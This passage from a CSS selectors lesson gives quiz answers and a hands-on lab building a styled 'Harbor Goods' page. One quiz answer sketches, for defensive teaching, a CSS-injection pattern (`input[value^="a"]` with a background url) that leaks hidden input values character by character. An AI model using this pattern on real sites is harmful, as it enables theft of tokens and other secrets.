subject?**\n\n**Answer:** `nav` is a type selector, the space is a descendant combinator, `a` is a type selector, and `:hover` is a pseudo-class attached to `a` (together `a:hover` is a compound selector). The subject, the element actually styled, is the rightmost compound selector: a link in the hover state that is somewhere inside a `<nav>`.\n\n**Q2. What is the difference between `.card.featured`, `.card .featured`, `.card > .featured`, and `.card, .featured`?**\n\n**Answer:** `.card.featured` matches one element that has both classes. `.card .featured` matches a `.featured` anywhere inside a `.card`. `.card > .featured` matches a `.featured` that is a direct child of a `.card`. `.card, .featured` is a selector list that matches any element with either class.\n\n**Q3. A `<ul class=\"menu\">` contains `<li>` items, and one of them holds a nested `<ul>` with more `<li>` items. What do `.menu li` and `.menu > li` match?**\n\n**Answer:** `.menu li` (descendant) matches every `<li>` inside the menu at any depth, including the nested ones. `.menu > li` (child) matches only the `<li>` elements that are direct children of `.menu`, leaving the nested items alone. Use `>` to stop styles leaking into nested lists.\n\n**Q4. What is the difference between `h2 + p` and `h2 ~ p`? Can either select an earlier sibling?**\n\n**Answer:** `h2 + p` selects a `<p>` that comes immediately after an `<h2>` (next sibling only). `h2 ~ p` selects every `<p>` that comes after an `<h2>` among the same parent's children (all later siblings). Neither can select an earlier sibling, since sibling combinators only look forward. To style something based on what comes after it, use `:has()`, for example `p:has(+ h2)`.\n\n**Q5. Calculate the specificity of `#products .card h3`, `ul > li a:hover`, `:where(#nav) a`, and `:is(#nav, .menu) a`. Which is strongest?**\n\n**Answer:** `#products .card h3` is (1,1,1). `ul > li a:hover` is (0,1,3) (one pseudo-class, three type selectors; the `>` adds nothing). `:where(#nav) a` is (0,0,1), because `:where()` contributes zero. `:is(#nav, .menu) a` is (1,0,1), because `:is()` takes its most specific argument, the ID. The strongest is `#products .card h3` (1,1,1), compared column by column from the left.\n\n**Q6. What is the difference between `p:first-child` and `p:first-of-type`, and what does `li:nth-child(-n+3)` match?**\n\n**Answer:** `p:first-child` matches a `<p>` that is the very first child of its parent. `p:first-of-type` matches the first `<p>` among its siblings, even if other elements come before it. `li:nth-child(-n+3)` matches an `<li>` that is among the first three children of its parent (the 1st, 2nd, and 3rd), because the formula `-n+3` gives 3, 2, 1.\n\n**Q7. Explain `:not()`, `:is()`, `:where()`, and `:has()`, including how each affects specificity.**\n\n**Answer:** `:not(S)` matches elements that do not match `S`. `:is(list)` matches elements matching any selector in the list, to shorten long selectors. `:where(list)` does the same but with zero specificity, ideal for easily overridden defaults. `:has(S)` matches an element that contains, or is followed by, something matching `S` (a parent or previous-sibling selector). Specificity: `:not()`, `:is()`, and `:has()` take the specificity of their most specific argument, and `:where()` contributes nothing.\n\n**Q8. What do `[href^=\"https\"]`, `[href$=\".pdf\"]`, `[href*=\"harbor\"]`, and `[class~=\"card\"]` match?**\n\n**Answer:** `^=` matches an `href` that **starts** with `https`. `$=` matches one that **ends** with `.pdf`. `*=` matches one that **contains** `harbor` anywhere. `~=` matches when `card` is one **whole word** in a space-separated list such as `class=\"product card featured\"`. Adding ` i` before the closing bracket makes any of them case-insensitive.\n\n**Q9. Why does `::before` need two colons, why does it need `content`, and why should important text not be put in it?**\n\n**Answer:** Two colons mark a pseudo-element (a part of an element), as opposed to a pseudo-class (a state), though the old single-colon form still works for `::before` and `::after`. Without a `content` property, the generated box is not created. Generated content is not part of the DOM, cannot be selected, and screen readers may skip or read it inconsistently, so only decoration belongs there. Real information belongs in the HTML.\n\n**Q10. Name two security risks related to selectors and one defence for each.**\n\n**Answer:** CSS injection with attribute selectors, where an attacker who can inject CSS uses rules like `input[value^=\"a\"] { background: url(...) }` to leak secret values (such as tokens in hidden inputs) one character at a time through the requests the browser makes; defend by never inserting untrusted input into CSS, keeping secrets out of attributes, and setting a strict Content Security Policy. Building JavaScript selectors from user input, such as `querySelector(\"#\" + userInput)`, which can break or change the selector; defend with `CSS.escape()` and `try...catch`. (Another valid answer: relying on CSS to hide sensitive content, which must be enforced on the server.)\n\n### Section B: Practical (one task, step by step)\n\n**Goal:** build a \"Selector Lab\" page for Harbor Goods and write CSS using every major selector family: type, class, ID, attribute, all four combinators, pseudo-classes, pseudo-elements, and the logical selectors. You will predict what each selector matches, test it in the browser Console, run a specificity experiment, break things on purpose, and validate the result.\n\n**What you need:** a computer, a web browser, and a plain text editor (Notepad on Windows, TextEdit in plain text mode on Mac, or a code editor such as Visual Studio Code). Allow about 75 to 90 minutes.\n\n**Step 1: Create the project folder.**\n\n1. Open your **Documents** (or **Desktop**) folder.\n2. Create a new folder named `harbor-selectors`.\n3. Open it and create a folder inside named `css`.\n\n**Step 2: Create the HTML file.**\n\n1. In your editor, create a new file and **Save As** `index.html` inside `harbor-selectors` (not inside `css`). Save as UTF-8, and make sure it ends in `.html`. (On Windows, tick **File name extensions** in File Explorer's **View** menu if you cannot see the ending.)\n2. This HTML is long, so you may copy and paste it. You will **type** all of the CSS yourself. Paste this and save:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Selector Lab | Harbor Goods</title>\n    <link rel=\"stylesheet\" href=\"css/style.css\">\n  </head>\n  <body>\n    <header class=\"site-header\">\n      <a class=\"logo\" href=\"index.html\">Harbor Goods</a>\n      <nav aria-label=\"Main\">\n        <ul class=\"nav-list\">\n          <li><a href=\"index.html\" aria-current=\"page\">Home</a></li>\n          <li><a href=\"#products\">Products</a></li>\n          <li><a href=\"#faq\">FAQ</a></li>\n          <li><a href=\"https://example.com/safety-guide.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">Safety guide</a></li>\n        </ul>\n      </nav>\n    </header>\n\n    <main>\n      <section id=\"products\">\n        <h2>Products</h2>\n        <p class=\"lead\">Tested gear for life on the water.</p>\n        <p>Every item is checked by our team before it goes on sale.</p>\n\n        <ul class=\"product-list\">\n          <li class=\"product\" data-in-stock=\"true\">\n            <h3>Coastal Pro Life Jacket</h3>\n            <p class=\"price\">$48</p>\n            <ul class=\"features\">\n              <li>50N buoyancy</li>\n              <li>Quick-release buckles</li>\n              <li>Reflective strips</li>\n            </ul>\n            <p class=\"note\">Free delivery over $50.</p>\n          </li>\n          <li class=\"product featured\" data-in-stock=\"true\">\n            <h3>Harbor Dry Bag 30L</h3>\n            <p class=\"price\">$32</p>\n            <p class=\"note\">Bestseller this season.</p>\n          </li>\n          <li class=\"product\" data-in-stock=\"false\">\n            <h3>Braided Dock Line</h3>\n            <p class=\"price\">$18</p>\n          </li>\n          <li class=\"product\" data-in-stock=\"true\">\n            <h3>Deck Gloves</h3>\n            <p class=\"price\">$22</p>\n          </li>\n        </ul>\n      </section>\n\n      <section id=\"faq\">\n        <h2>FAQ</h2>\n        <div class=\"faq\">\n          <h3>How long is delivery?</h3>\n          <p>Usually three to five working days.</p>\n          <h3>Can I return an item?</h3>\n          <p>Yes, within 30 days if it is unused.</p>\n        </div>\n      </section>\n\n      <section id=\"contact\">\n        <h2>Contact us</h2>\n        <form action=\"#\" method=\"post\">\n          <p>\n            <label for=\"name\">Name</label><br>\n            <input type=\"text\" id=\"name\" name=\"name\" required placeholder=\"Your name\">\n          </p>\n          <p>\n            <label for=\"email\">Email</label><br>\n            <input type=\"email\" id=\"email\" name=\"email\" required placeholder=\"you@example.com\">\n          </p>\n          <p>\n            <label for=\"topic\">Topic</label><br>\n            <select id=\"topic\" name=\"topic\">\n              <option>Order</option>\n              <option>Returns</option>\n              <option>Other</option>\n            </select>\n          </p>\n          <p>\n            <label for=\"code\">Promo code (not available yet)</label><br>\n            <input type=\"text\" id=\"code\" name=\"code\" disabled>\n          </p>\n          <p>\n            <label><input type=\"checkbox\" name=\"news\"> <span>Send me offers</span></label>\n          </p>\n          <button type=\"submit\">Send</button>\n        </form>\n      </section>\n    </main>\n\n    <footer class=\"site-footer\">\n      <p>&copy; 2026 Harbor Goods</p>\n    </footer>\n  </body>\n</html>\n```\n\n3. Double-click `index.html` to open it in your browser. You will see plain, unstyled HTML. Keep the browser open. After every step below, save the CSS file, switch to the browser, and press `F5`.\n\n**Step 3: Create the stylesheet and prove it is connected.**\n\n1. Create a new file and **Save As** `style.css` **inside the `css` folder**.\n2. Type this and save:\n\n```css\n:root {\n  --blue: #0b3d5c;\n  --light: #f4f8fb;\n  --card: #ffffff;\n  --text: #1c1c1c;\n  --border: #d6e2ea;\n  --accent: #f2a900;\n}\n\n*, *::before, *::after {\n  box-sizing: border-box;\n}\n\nbody {\n  margin: 0 auto;\n  max-width: 50rem;\n  padding: 1rem;\n  font-family: system-ui, sans-serif;\n  line-height: 1.6;\n  color: var(--text);\n  background: var(--light);\n}\n```\n\n3. Refresh. The page should now sit in a centred column on a pale background. If not, check that the file is `css/style.css` and that the `<link>` path matches.\n\n**Step 4: Type selectors and selector lists.**\n\nAdd to the **end** of `style.css`:\n\n```css\nh2, h3 {\n  color: var(--blue);\n  line-height: 1.25;\n}\n\nh2 { margin-top: 2rem; }\n```\n\nSave and refresh. All headings turn blue. **Prediction check:** which two selectors are in the list? What would happen to `h3` if you deleted the comma? (Answer after trying: `h2 h3` would only match an `h3` inside an `h2`, which does not exist, so no headings would be styled.) Try it, then restore the comma.\n\n**Step 5: Class, ID, and compound selectors.**\n\nAdd:\n\n```css\n.product-list {\n  list-style: none;\n  padding: 0;\n  display: grid;\n  gap: 1rem;\n}\n\n.product {\n  background: var(--card);\n  border: 1px solid var(--border);\n  border-radius: 0.5rem;\n  padding: 1rem;\n}\n\n.product.featured {\n  border: 2px solid var(--accent);\n}\n\n#products {\n  scroll-margin-top: 1rem;\n}\n```\n\nSave and refresh. The four products become cards, and the bag has a gold border. **Notice:** `.product.featured` has no space, so it matches one element with both classes. `#products` is an ID selector: it works, but it is the kind of selector you should keep for anchors, not for styling.\n\n**Step 6: Descendant versus child combinators (the nested list trap).**\n\n1. Add this rule first and **look carefully** at the result:\n\n```css\n.product-list li {\n  border-left: 6px solid crimson;\n}\n```\n\n2. Save and refresh. You should see a red left border on all four cards **and** on each of the three nested feature items inside the first card. That is seven elements, because the descendant combinator matches `li` at any depth.\n3. Now **change the selector** to use the child combinator:\n\n```css\n.product-list > li {\n  border-left: 6px solid crimson;\n}\n```\n\n4. Save and refresh. Now only the four cards have the red border. The nested items are untouched.\n5. Write in a notepad: how many elements did each version match, and why? Keep the child version.\n\n**Step 7: Sibling combinators.**\n\nAdd:\n\n```css\n.lead + p {\n  margin-top: 0;\n  color: #444;\n}\n\n.lead ~ p {\n  font-style: italic;\n}\n\nh3 + .price {\n  font-size: 1.25rem;\n  font-weight: 700;\n  color: var(--blue);\n}\n\n.faq h3 + p {\n  margin-top: 0;\n}\n```\n\nSave and refresh. The plain paragraph under \"Tested gear...\" turns grey and italic, and each price becomes large and bold. **Predict then check:**\n\n1. Does `.lead ~ p` match the `<ul class=\"product-list\">`? (No, it is not a `<p>`.)\n2. Does `h3 + .note` match anything? Try adding `h3 + .note { color: red; }`. (No: in the first card the price comes between the heading and the note, and in the second card the price does as well.) Delete that test rule.\n\n**Step 8: Attribute selectors.**\n\nAdd:\n\n```css\na[target=\"_blank\"]::after {\n  content: \" \\2197\";\n}\n\na[href$=\".pdf\"] {\n  font-weight: 700;\n}\n\n[aria-current=\"page\"] {\n  text-decoration: none;\n  border-bottom: 2px solid var(--accent);\n}\n\n[data-in-stock=\"false\"] {\n  opacity: 0.6;\n}\n\n[data-in-stock=\"false\"] h3 {\n  text-decoration: line-through;\n}\n\ninput[type=\"email\"] {\n  border-width: 2px;\n}\n```\n\nSave and refresh. The PDF link is bold and shows an arrow, the current page link has an underline, and the out-of-stock dock line is faded with a struck-through title. **Experiment:** add `a[href$=\".pdf\"]::after { content: \" PDF\"; }` and refresh. The arrow disappears and is replaced by \"PDF\". Why? (An element has only one `::after`; both rules have the same specificity, so the later one wins.) Delete the experiment.\n\n**Step 9: Navigation layout and interaction pseudo-classes.**\n\nAdd:\n\n```css\n.site-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  flex-wrap: wrap;\n  gap: 1rem;\n}\n\n.nav-list {\n  display: flex;\n  gap: 1.25rem;\n  list-style: none;\n  margin: 0;\n  padding: 0;\n}\n\na { color: var(--blue); }\n\na:hover {\n  text-decoration: none;\n  background: #e5f1f8;\n}\n\na:focus-visible,\nbutton:focus-visible,\ninput:focus-visible,\nselect:focus-visible {\n  outline: 3px solid var(--accent);\n  outline-offset: 2px;\n}\n```\n\nSave and refresh. Hover over links, then press `Tab` repeatedly and watch the gold focus ring move through links, form fields, and the button.\n\n**Step 10: Structural pseudo-classes.**\n\nAdd:\n\n```css\n.product-list > li:first-child {\n  box-shadow: 0 2px 8px rgb(0 0 0 / 0.15);\n}\n\n.product-list > li:nth-child(even) {\n  background: #eef5fa;\n}\n\n.product-list > li:last-child {\n  margin-bottom: 1rem;\n}\n\n.features li:nth-child(-n+2) {\n  font-weight: 600;\n}\n```\n\nSave and refresh. The first card has a shadow, the second and fourth cards have a tinted background, and the first **two** feature items are bold (`-n+2`). Predict and test: change `-n+2` to `n+2` and refresh. Which items are bold now? (The 2nd and every later one.) Change it back.\n\n**Step 11: Logical pseudo-classes (`:not`, `:is`, `:has`).**\n\nAdd:\n\n```css\n.product:not(.featured) {\n  border-color: var(--border);\n}\n\n:is(.site-header, .site-footer) a {\n  text-underline-offset: 3px;\n}\n\n.product:has(.note) {\n  border-top: 4px solid var(--blue);\n}\n\n.product:has(> .features) {\n  padding-bottom: 1.5rem;\n}\n```\n\nSave and refresh. The two cards that contain a `.note` get a thick blue top border, and the first card (which has direct `.features`) gets extra bottom padding. **Predict:** which cards match `.product:has(.note)`? (The first and second.) If your browser is old and `:has()` does not work, nothing will change. That is why section 3.10 recommends `@supports`.\n\n**Step 12: Form state pseudo-classes.**\n\nAdd:\n\n```css\nform p:focus-within {\n  background: #fff8e1;\n}\n\ninput:required {\n  border: 2px solid var(--blue);\n}\n\ninput:required:invalid:not(:placeholder-shown) {\n  border-color: #b00020;\n}\n\ninput:disabled {\n  background: #e8e8e8;\n  cursor: not-allowed;\n}\n\ninput[type=\"checkbox\"]:checked + span {\n  font-weight: 700;\n}\n\nform button {\n  background: var(--accent);\n  border: 0;\n  padding: 0.6rem 1.25rem;\n  border-radius: 0.5rem;\n  font-weight: 600;\n}\n```\n\nSave and refresh. Test each one:\n\n1. Click in the Name box: the whole row gets a pale yellow background (`:focus-within`).\n2. Type `hello` in the email box: the border turns red because the value is not a valid email and the field is not showing its placeholder.\n3. Clear it: the border returns to blue (the placeholder is showing again).\n4. The promo code box is greyed out (`:disabled`).\n5. Tick the \"Send me offers\" box: the text becomes bold (`:checked + span`, a sibling combinator inside the label).\n\n**Step 13: Pseudo-elements.**\n\nAdd:\n\n```css\n.lead::first-letter {\n  font-size: 1.8em;\n  font-weight: 700;\n  color: var(--blue);\n}\n\n.features li::marker {\n  color: var(--accent);\n}\n\n.note::before {\n  content: \"\\2605  \";\n  color: var(--accent);\n}\n\ninput::placeholder {\n  color: #5a6b78;\n}\n\n::selection {\n  background: var(--accent);\n  color: #000;\n}\n```\n\nSave and refresh. The first letter of \"Tested gear...\" is bigger, the bullets are gold, the notes have a star in front, and when you select text with the mouse the highlight is gold. **Check yourself:** right-click a note and use **Inspect**. Is the star in the DOM tree? (No: it is generated content, shown in the Elements panel as `::before` only. This is why you must never put meaningful text there.)\n\n**Step 14: The specificity experiment.**\n\nYou will predict who wins before each refresh. Write your prediction in a notepad first.\n\n1. Add these rules to the end, one block at a time, saving and refreshing after each block. Look at the title of the **featured** card (\"Harbor Dry Bag 30L\"). The earlier `h2, h3` rule already makes it blue.\n\nBlock A:\n\n```css\n.product h3 { color: darkgreen; }          /* (0,1,1) */\n```\n\nPrediction: the title is darkgreen, because (0,1,1) beats the earlier `h2, h3` rule (0,0,1).\n\nBlock B:\n\n```css\nli.featured h3 { color: purple; }          /* (0,1,2) */\n```\n\nPrediction: purple, because (0,1,2) beats (0,1,1) (the same classes but more type selectors).\n\nBlock C:\n\n```css\n.product.featured h3 { color: crimson; }   /* (0,2,1) */\n```\n\nPrediction: crimson, because the second column (two classes) beats one class, regardless of order.\n\nBlock D:\n\n```css\n#products h3 { color: orange; }            /* (1,0,1) */\n```\n\nPrediction: orange. **Every** product title in the products section turns orange, because an ID beats any number of classes.\n\nBlock E:\n\n```css\n:where(#products) h3 { color: black; }     /* (0,0,1) */\n```\n\nPrediction: no change, because `:where()` contributes zero, so this is only (0,0,1) and loses.\n\n2. In developer tools (`F12`), select the featured card's `<h3>` and look at the **Styles** pane. Find which rules are crossed out. In Chromium browsers you can hover over a selector to see its specificity.\n3. **Undo the experiment:** delete blocks A to E.\n\n**Step 15: Test selectors in the Console and predict the counts.**\n\n1. In the browser, press `F12` and click the **Console** tab.\n2. For each command in the table, **write your predicted number first**, then run it:\n\n| Command | Predict | Expected |\n|---|---|---|\n| `$$(\".product-list > li\").length` | | 4 |\n| `$$(\".product-list li\").length` | | 7 |\n| `$$(\".product:not(.featured)\").length` | | 3 |\n| `$$(\"[data-in-stock='false']\").length` | | 1 |\n| `$$(\"a[target='_blank']\").length` | | 1 |\n| `$$(\".product:has(.note)\").length` | | 2 |\n| `$$(\"input:required\").length` | | 2 |\n| `$$(\".lead ~ p\").length` | | 1 |\n| `$$(\".faq h3 + p\").length` | | 2 |\n| `$$(\"h3\").length` | | 6 |\n| `$$(\".product-list > li:nth-child(odd)\").length` | | 2 |\n\n3. Try the helper methods:\n\n```javascript\nconst bag = $(\".featured\");\nbag.matches(\".product\");                    // true\nbag.matches(\"li.product.featured\");         // true\n$(\".features li\").closest(\".product\").querySelector(\"h3\").textContent;   // the first card's title\nCSS.escape(\"1st-item\");                     // \"\\31 st-item\"\n```\n\n4. Write down which result surprised you.\n\n**Step 16: Break things on purpose.**\n\nMake each change in `style.css` one at a time, refresh, observe, and undo it:\n\n1. Change `.product.featured` to `.product .featured`. Does the gold border disappear? Why? (A `.featured` inside a `.product` does not exist.)\n2. Misspell a class: `.prodcut`. What happens, and how can you tell in the **Styles** pane that no rule applied?\n3. Add this rule and see whether the headings still turn red:\n\n```css\nh2, :unknown-thing { color: red; }\n```\n\n(The whole rule is dropped, because one selector is invalid.) Now change it to `:is(h2, :unknown-thing) { color: red; }` and refresh. (The `h2` headings turn red: the forgiving list ignores the invalid item.) Delete the test.\n\n4. Delete the closing brace `}` of one rule. See how it can damage the next rule, and note what the browser does. Restore it.\n5. Wrap the `:has()` rule in `@supports`, which is the safe way to use new selectors:\n\n```css\n@supports selector(:has(a)) {\n  .product:has(.note) { border-top: 4px solid var(--blue); }\n}\n```\n\nReplace your earlier `:has(.note)` rule with this version and confirm it still works.\n\n**Step 17: Accessibility and validation check.**\n\n1. Keyboard test: press `Tab` from the top of the page. Every link, input, select, and button should show a clear gold focus ring, and the order should match the visual order.\n2. Zoom to 200% (`Ctrl` and `+`, or `Cmd` and `+`). Nothing should overlap or need sideways scrolling.\n3. Open **Lighthouse** in developer tools, tick **Accessibility**, and run it. Fix any contrast issue it reports.\n4. Go to `jigsaw.w3.org/css-validator`, choose **By direct input**, paste `style.css`, and click **Check**. Read each message. (A validator may flag very new selectors such as `:has()`, or `\\2197` in `content`, depending on its version. Decide whether each is a real mistake.)\n5. Go to `validator.w3.org`, paste `index.html`, and check it as well.\n\n**Step 18: Security review.**\n\nAnswer in a notepad:\n\n1. Which selectors in your CSS depend on **attributes** (`[data-in-stock]`, `[aria-current]`, `[href$=\".pdf\"]`)? Would any of these ever contain a secret? Why should you never store a token or password in an attribute?\n2. Does your page insert any user-provided text into CSS or into a `style` attribute? How would you let a visitor safely choose a theme instead?\n3. If you built `document.querySelector(\"#\" + userInput)`, what could go wrong, and which function protects you?\n4. Is any important information (a price, a warning) placed only in `::before` or `::after`? Where should it live instead?\n\n**Step 19: Reflect.**\n\nAnswer in a notepad (one or two lines each):\n\n1. Which combinator surprised you most, and why?\n2. What is the difference between a space and a `>` in a selector?\n3. Which pseudo-class would you use to highlight a whole form row while a field inside it has focus?\n4. Why did `#products h3` beat every class-based rule?\n5. When would you choose `:where()` instead of `:is()`?\n6. What would you change to make your selectors easier to maintain?\n\n**Finished check.** You should have: a project with `index.html` and `css/style.css`; type, class, ID, compound, list, and attribute selectors; all four combinators (descendant, child, next sibling, subsequent sibling) used on purpose; structural, user-action, logical (`:not`, `:is`, `:has`), and form pseudo-classes; pseudo-elements (`::first-letter`, `::marker`, `::before`, `::placeholder`, `::selection`); a specificity experiment with correct predictions; Console counts that matched your predictions; a safe `@supports` version of `:has()`; visible focus styles; and clean results from both validators.\n\n### Self-check\n\n| Skill | Done |\n|---|---|\n| Name the parts of a selector (simple, compound, complex, list, subject) | ☐ |\n| Write type, universal, class, ID, and compound selectors | ☐ |\n| Write selector lists and explain the \"one invalid selector\" rule | ☐ |\n| Use all attribute selector operators (`^=`, `$=`, `*=`, `~=`, `\\|=`, `i`) | ☐ |\n| Tell `.a.b`, `.a .b`, `.a > .b`, and `.a, .b` apart | ☐ |\n| Use the descendant and child combinators correctly | ☐ |\n| Use the adjacent (`+`) and general (`~`) sibling combinators | ☐ |\n| Read a selector from right to left | ☐ |\n| Use user-action pseudo-classes (`:hover`, `:focus-visible`, `:focus-within`) | ☐ |\n| Write `:nth-child` formulas (`odd`, `2n`, `n+3`, `-n+3`) | ☐ |\n| Distinguish `:first-child` from `:first-of-type` | ☐ |\n| Use form pseudo-classes (`:required`, `:invalid`, `:checked`, `:disabled`) | ☐ |\n| Use `::before`, `::after`, `::marker`, `::first-letter`, `::placeholder`, `::selection` | ☐ |\n| Explain why important text does not belong in generated content | ☐ |\n| Use `:not()`, `:is()`, `:where()`, and `:has()` | ☐ |\n| Write simple nested CSS with `&` | ☐ |\n| Calculate specificity as (a, b, c) and predict the winner | ☐ |\n| Keep selectors short, low-specificity, and class-based | ☐ |\n| Use `querySelector`, `matches`, `closest`, and `CSS.escape` | ☐ |\n| Test selectors with `$$()` in the Console | ☐ |\n| Debug selectors with the Styles pane | ☐ |\n| Use `@supports selector()` for progressive enhancement | ☐ |\n| Apply accessibility practices to selectors and states | ☐ |\n| Explain CSS-injection and `:visited` privacy risks | ☐ |\n\n**Lesson complete.**";
